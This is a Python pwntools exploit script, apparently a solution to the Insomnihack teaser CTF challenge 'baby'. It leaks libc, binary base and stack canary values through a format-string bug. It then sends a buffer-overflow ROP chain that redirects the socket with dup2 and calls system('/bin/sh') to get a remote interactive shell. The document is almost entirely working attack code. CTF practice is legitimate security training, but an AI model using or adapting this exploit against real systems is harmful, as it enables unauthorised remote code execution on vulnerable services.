from pwn import *

g1 = 0x1c8b             #pop rdi;ret;
g2 = 0x1c89             #pop rsi;pop r15;ret;

def leak_first():
    p.sendlineafter("> ",'2')
    p.sendlineafter("> ",'%llx-'*158)
    val = p.recvline().strip().split('-')
    p.sendline('')
    libc,text,canary = int(val[-2],16),int(val[139],16),int(val[137],16)
    return libc-0x20830,text-0x19cf,canary

def bof_stack():
    p.sendlineafter("> ","1")
    payload = fit({1032:p64(canary),1048:p64(g2)+p64(0),1072:p64(g1)+p64(fd)+p64(dup2)})
    payload+= p64(g2)+p64(1)+p64(0)+p64(g1)+p64(fd)+p64(dup2)
    payload+= p64(g2)+p64(0)+p64(0)+p64(g1)+p64(binsh)+p64(system)
    p.sendlineafter("?",str(len(payload)+1))
    p.sendline(payload)
    log.info(p.recvline())
    p.interactive()

if __name__ == "__main__":
    fd=4
    p = remote("baby.teaser.insomnihack.ch",1337)
    libc,text,canary=leak_first()
    elf = ELF("libc.so")
    elf.address = libc
    binsh = elf.search("/bin/sh").next()
    system = elf.symbols['system']
    dup2 = elf.symbols['dup2']
    g1+= text
    g2+= text
    bof_stack()
